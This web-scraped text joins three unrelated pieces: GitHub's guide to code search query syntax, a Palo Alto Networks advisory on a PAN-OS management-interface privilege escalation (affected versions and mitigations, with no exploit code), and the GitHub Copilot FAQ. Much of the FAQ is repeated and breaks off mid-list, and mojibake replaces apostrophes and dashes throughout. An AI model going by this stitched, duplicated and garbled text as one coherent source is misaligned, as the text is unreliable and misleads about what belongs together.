# Understanding GitHub Code Search syntax

You can build search queries for the results you want with specialized code qualifiers, regular expressions, and boolean operations.

## [About code search query structure](#about-code-search-query-structure)

The search syntax in this article only applies to searching code with GitHub code search. Note that the syntax and qualifiers for searching for non-code content, such as issues, users, and discussions, is not the same as the syntax for code search. For more information on non-code search, see [About searching on GitHub](/en/search-github/getting-started-with-searching-on-github/about-searching-on-github) and [Searching on GitHub](/en/search-github/searching-on-github).

Search queries consist of search terms, comprising text you want to search for, and qualifiers, which narrow down the search.

A bare term with no qualifiers will match either the content of a file or the file's path.

For example, the following query:

```
http-push

```

The above query will match the file `docs/http-push.txt`, even if it doesn't contain the term `http-push`. It will also match a file called `example.txt` if it contains the term `http-push`.

You can enter multiple terms separated by whitespace to search for documents that satisfy both terms.

For example, the following query:

```
sparse index

```

The search results would include all documents containing both the terms `sparse` and `index`, in any order. As examples, it would match a file containing `SparseIndexVector`, a file with the phrase `index for sparse trees`, and even a file named `index.txt` that contains the term `sparse`.

Searching for multiple terms separated by whitespace is the equivalent to the search `hello AND world`. Other boolean operations, such as `hello OR world`, are also supported. For more information about boolean operations, see [Using boolean operations](#using-boolean-operations).

Code search also supports searching for an exact string, including whitespace. For more information, see [Query for an exact match](#query-for-an-exact-match).

You can narrow your code search with specialized qualifiers, such as `repo:`, `language:` and `path:`. For more information on the qualifiers you can use in code search, see [Using qualifiers](#using-qualifiers).

You can also use regular expressions in your searches by surrounding the expression in slashes. For more information on using regular expressions, see [Using regular expressions](#using-regular-expressions).

## [Query for an exact match](#query-for-an-exact-match)

To search for an exact string, including whitespace, you can surround the string in quotes. For example:

```
"sparse index"

```

You can also use quoted strings in qualifiers, for example:

```
path:git language:"protocol buffers"

```
## [Searching for quotes and backslashes](#searching-for-quotes-and-backslashes)

To search for code containing a quotation mark, you can escape the quotation mark using a backslash. For example, to find the exact string `name = "tensorflow"`, you can search:

```
"name = \"tensorflow\""

```

To search for code containing a backslash, `\`, use a double backslash, `\\`.

The two escape sequences `\\` and `\"` can be used outside of quotes as well. No other escape sequences are recognized, though. A backslash that isn't followed by either `"` or `\` is included in the search, unchanged.

Additional escape sequences, such as `\n` to match a newline character, are supported in regular expressions. See [Using regular expressions](#using-regular-expressions).

## [Using boolean operations](#using-boolean-operations)

Code search supports boolean expressions. You can use the operators `AND`, `OR`, and `NOT` to combine search terms.

By default, adjacent terms separated by whitespace are equivalent to using the `AND` operator. For example, the search query `sparse index` is the same as `sparse AND index`, meaning that the search results will include all documents containing both the terms `sparse` and `index`, in any order.

To search for documents containing either one term or the other, you can use the `OR` operator. For example, the following query will match documents containing either `sparse` or `index`:

```
sparse OR index

```

To exclude files from your search results, you can use the `NOT` operator. For example, to exclude files in the `__testing__` directory, you can search:

```
"fatal error" NOT path:__testing__

```

You can use parentheses to express more complicated boolean expressions. For example:

```
(language:ruby OR language:python) AND NOT path:"/tests/"

```
## [Using qualifiers](#using-qualifiers)

You can use specialized keywords to qualify your search.

* [Repository qualifier](#repository-qualifier)
* [Organization and user qualifiers](#organization-and-user-qualifiers)
* [Language qualifier](#language-qualifier)
* [Path qualifier](#path-qualifier)
* [Symbol qualifier](#symbol-qualifier)
* [Content qualifier](#content-qualifier)
* [Is qualifier](#is-qualifier)

### [Repository qualifier](#repository-qualifier)

To search within a repository, use the `repo:` qualifier. You must provide the full repository name, including the owner. For example:

```
repo:github-linguist/linguist

```

To search within a set of repositories, you can combine multiple `repo:` qualifiers with the boolean operator `OR`. For example:

```
repo:github-linguist/linguist OR repo:tree-sitter/tree-sitter

```

Note

Code search does not currently support regular expressions or partial matching for repository names, so you will have to type the entire repository name (including the user prefix) for the `repo:` qualifier to work.

### [Organization and user qualifiers](#organization-and-user-qualifiers)

To search for files within an organization, use the `org:` qualifier. For example:

```
org:github

```

To search for files within a personal account, use the `user:` qualifier. For example:

```
user:octocat

```

Note

Code search does not currently support regular expressions or partial matching for organization or user names, so you will have to type the entire organization or user name for the qualifier to work.

### [Language qualifier](#language-qualifier)

To narrow down to a specific languages, use the `language:` qualifier. For example:

```
language:ruby OR language:cpp OR language:csharp

```

For a complete list of supported language names, see [languages.yaml](https://github.com/github-linguist/linguist/blob/main/lib/linguist/languages.yml) in [github-linguist/linguist](https://github.com/github-linguist/linguist). If your preferred language is not on the list, you can open a pull request to add it.

### [Path qualifier](#path-qualifier)

To search within file paths, use the `path:` qualifier. This will match files containing the term anywhere in their file path. For example, to find files containing the term `unit_tests` in their path, use:

```
path:unit_tests

```

The above query will match both `src/unit_tests/my_test.py` and `src/docs/unit_tests.md` since they both contain `unit_test` somewhere in their path.

To match only a specific filename (and not part of the path), you could use a regular expression:

```
path:/(^|\/)README\.md$/

```

Note that the `.` in the filename is escaped, since `.` has special meaning for regular expressions. For more information about using regular expressions, see [Using regular expressions](#using-regular-expressions).

You can also use some limited glob expressions in the `path:` qualifier.

For example, to search for files with the extension `txt`, you can use:

```
path:*.txt

```

To search for JavaScript files within a `src` directory, you could use:
```
path:src/*.js

```

* By default, glob expressions are not anchored to the start of the path, so the above expression would still match a path like `app/src/main.js`. But if you prefix the expression with `/`, it will anchor to the start. For example:

  ```
  path:/src/*.js

  ```
* Note that `*` doesn't match the `/` character, so for the above example, all results will be direct descendants of the `src` directory. To match within subdirectories, so that results include deeply nested files such as `/src/app/testing/utils/example.js`, you can use `**`. For example:

  ```
  path:/src/**/*.js

  ```

You can also use the `?` global character. For example, to match the path `file.aac` or `file.abc`, you can use:

```
path:*.a?c

```

To search for a filename which contains a special character like `\*` or `?`, just use a quoted string:
```
path:"file?"

```

Glob expressions are disabled for quoted strings, so the above query will only match paths containing the literal string `file?`.

### [Symbol qualifier](#symbol-qualifier)

You can search for symbol definitions in code, such as function or class definitions, using the `symbol:` qualifier. Symbol search is based on parsing your code using the open source [Tree-sitter](https://github.com/tree-sitter) parser ecosystem, so no extra setup or build tool integration is required.

For example, to search for a symbol called `WithContext`:

```
language:go symbol:WithContext

```

In some languages, you can search for symbols using a prefix (e.g. a prefix of their class name). For example, for a method `deleteRows` on a struct `Maint`, you could search `symbol:Maint.deleteRows` if you are using Go, or `symbol:Maint::deleteRows` in Rust.

You can also use regular expressions with the symbol qualifier. For example, the following query would find conversions people have implemented in Rust for the `String` type:

```
language:rust symbol:/^String::to_.*/

```

Note that this qualifier only searches for definitions and not references, and not all symbol types or languages are fully supported yet. Symbol extraction is supported for the following languages:

* Bash
* C
* C#
* C++
* CodeQL
* Elixir
* Go
* JSX
* Java
* JavaScript
* Lua
* PHP
* Protocol Buffers
* Python
* R
* Ruby
* Rust
* Scala
* Starlark
* Swift
* Typescript

We are working on adding support for more languages. If you would like to help contribute to this effort, you can add support for your language in the open source [Tree-sitter](https://github.com/tree-sitter) parser ecosystem, upon which symbol search is based.

### [Content qualifier](#content-qualifier)

By default, bare terms search both paths and file content. To restrict a search to strictly match the content of a file and not file paths, use the `content:` qualifier. For example:

```
content:README.md

```

This query would only match files containing the term `README.md`, rather than matching files named `README.md`.

### [Is qualifier](#is-qualifier)

To filter based on repository properties, you can use the `is:` qualifier. `is:` supports the following values:

* `archived`: restricts the search to archived repositories.
* `fork`: restricts the search to forked repositories.
* `vendored`: restricts the search to content detected as vendored.
* `generated`: restricts the search to content detected as generated.

For example:

```
path:/^MIT.txt$/ is:archived

```

Note that the `is:` qualifier can be inverted with the `NOT` operator. To search for non-archived repositories, you can search:

```
log4j NOT is:archived

```

To exclude forks from your results, you can search:

```
log4j NOT is:fork

```
## [Using regular expressions](#using-regular-expressions)

Code search supports regular expressions to search for patterns in your code. You can use regular expressions in bare search terms as well as within many qualifiers, by surrounding the regex in slashes.

For example, to search for the regular expression `sparse.*index`, you would use:

```
/sparse.*index/

```

Note that you'll have to escape any forward slashes within the regular expression. For example, to search for files within the `App/src` directory, you would use:

```
/^App\/src\//

```

Inside a regular expression, `\n` stands for a newline character, `\t` stands for a tab, and `\x{hhhh}` can be used to escape any Unicode character. This means you can use regular expressions to search for exact strings that contain characters that you can't type into the search bar.

Most common regular expressions features work in code search. However, "look-around" assertions are not supported.

## [Separating search terms](#separating-search-terms)

All parts of a search, such as search terms, exact strings, regular expressions, qualifiers, parentheses, and the boolean keywords `AND`, `OR`, and `NOT`, must be separated from one another with spaces. The one exception is that items inside parentheses, `(` `)`, don't need to be separated from the parentheses.

If your search contains multiple components that aren't separated by spaces, or other text that does not follow the rules listed above, code search will try to guess what you mean. It often falls back on treating that component of your query as the exact text to search for. For example, the following query:

```
printf("hello world\n");

```

Code search will give up on interpreting the parentheses and quotes as special characters and will instead search for files containing that exact code.

If code search guesses wrong, you can always get the search you wanted by using quotes and spaces to make the meaning clear.

## [Case sensitivity](#case-sensitivity)

By default, code search is case-insensitive, and results will include both uppercase and lowercase results. You can do case-sensitive searches by using a regular expression with case insensitivity turned off. For example, to search for the string "True", you would use:

```
/(?-i)True/

```

### Description

A privilege escalation vulnerability in Palo Alto Networks PAN-OS software allows a PAN-OS administrator with access to the management web interface to perform actions on the firewall with root privileges.

This issue is applicable to PAN-OS 10.1, PAN-OS 10.2, PAN-OS 11.0, PAN-OS 11.1, and PAN-OS 11.2 software on PA-Series, VM-Series, and CN-Series firewalls and on Panorama (virtual and M-Series)Â and WildFire appliances.

Cloud NGFW and Prisma Access are not impacted by this vulnerability.

### Product Status

| Versions | Affected | Unaffected |
| Cloud NGFW | None | All |
| PAN-OS 11.2 | < 11.2.4-h1 | >= 11.2.4-h1 |
| PAN-OS 11.1 | < 11.1.5-h1 | >= 11.1.5-h1 |
| PAN-OS 11.0 | < 11.0.6-h1 | >= 11.0.6-h1 |
| PAN-OS 10.2 | < 10.2.12-h2 | >= 10.2.12-h2 |
| PAN-OS 10.1 | < 10.1.14-h6 | >= 10.1.14-h6 |
| Prisma Access | None | All |

See the Solution section for additional fixes to commonly deployed maintenance releases.

### Required Configuration for Exposure

The risk is greatest if you configure the management interface to enable access from the internet or any untrusted network either:

1. Directly
   or
2. Through a dataplane interface that includes a management interface profile.

The risk is greatly reduced if you make sure that only trusted internal IP addresses are allowed to access the management interface.

Use the following steps to identify your recently detected devices in our Internet scans:

1. To find your known assets that require remediation action, visit the Assets section of Customer Support Portal at [https://support.paloaltonetworks.com](https://support.paloaltonetworks.com/)Â (Products â Assets â All Assets â Remediation Required).
2. The list of your known devices with an internet-facing management interface discovered in our scans are tagged with PAN-SA-2024-0015 with a last seen timestamp in UTC. If no such devices are listed, it indicates our scan did not find any devices with internet-facing management interface for your account in the last three days.

GlobalProtect Portals and Gateways are not vulnerable to this issue. However, if a management profile is configured on interfaces with GlobalProtect portals or gateways, then it exposes the device to attacks via the management web interface (typically accessible on port 4443) in such cases.

### Severity: MEDIUM, Suggested Urgency: HIGHEST

The risk is highest when you allow access to the management interface from external IP addresses on the internet. The worst impact is that a malicious administrator is able to tamper with the system integrity.
CVSS-BT:
6.9 /
CVSS-B:
6.9 ([CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:A/AU:N/R:U/V:C/RE:H/U:Red](https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:A/AU:N/R:U/V:C/RE:H/U:Red))

If you configure a specific list of IP addresses that only allow access to the management interface, you greatly reduce the risk of exploitation because attacks would require privileged access using only those IP addresses.

### Workarounds and Mitigations

Recommended mitigationâThe vast majority of firewalls already follow Palo Alto Networks and industry best practices. However, if you havenât already, we strongly recommend that you secure access to your management interface according to our best practice deployment guidelines. Specifically, you should restrict access to the management interface to only trusted internal IP addresses to prevent external access from the internet.

### Frequently asked questions

#### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. Thatâs why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who donât and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the worldâs most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilotâs best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot âcopy/pasteâ?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilotâs suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not âcopying and pastingâ from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editorâfocusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilotâs model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilotâs model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilotâs model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

Organizations can choose between GitHub Copilot Business and GitHub Copilot Enterprise. GitHub Copilot Business primarily features GitHub Copilot in the coding environment - that is the IDE, CLI and GitHub Mobile. GitHub Copilot Enterprise includes everything in GitHub Copilot Business. It alsoÂ  adds an additional layer of customization for organizations and integrates into GitHub.com as a chat interface to allow developers to converse with CopilotÂ  throughout the platform. GitHub Copilot Enterprise can index an organizationâs codebase for a deeper understanding of the customerâs knowledge for more tailored suggestions and will offer customers access to fine-tuned custom, private models for code completion.

#### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHubâs model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHubâs Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHubâs retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those featuresâ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EUâs General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

#### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilotâs suggestions (in rare instances) may resemble the code its model was trained on. Hereâs some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:Â  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilotâs AI model was trained with the use of code from GitHubâs public repositoriesâwhich are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHubâs research), suggestions from GitHub may match examples of code used to train GitHubâs AI model. Again, Copilot does not âlook upâ or âcopy and pasteâ code, but is instead using context from a userâs workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilotâs model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If thereâs a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositoriesâincluding ones without licensesâthat code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We donât determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered âfunctionalâ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years weâve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. Itâs not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called âCopilotâ not âAutopilotâ and itâs not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilotâs suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses â rigorous functionality testing, code scanning, security testing, etc. â you should continue these policies with Copilotâs suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilotâs suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* Youâre entitled to IP indemnification from GitHub for the unmodified suggestions when Copilotâs filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilotâs ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).
2. Feature in public beta for Copilot Pro and Business plans. Requires use of repositories, issues, discussions, Actions, and other features of GitHub.

GeneralPlans & PricingPrivacyResponsible AI
### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. Thatâs why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who donât and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the worldâs most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilotâs best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot âcopy/pasteâ?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilotâs suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not âcopying and pastingâ from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editorâfocusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilotâs model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilotâs model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilotâs model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

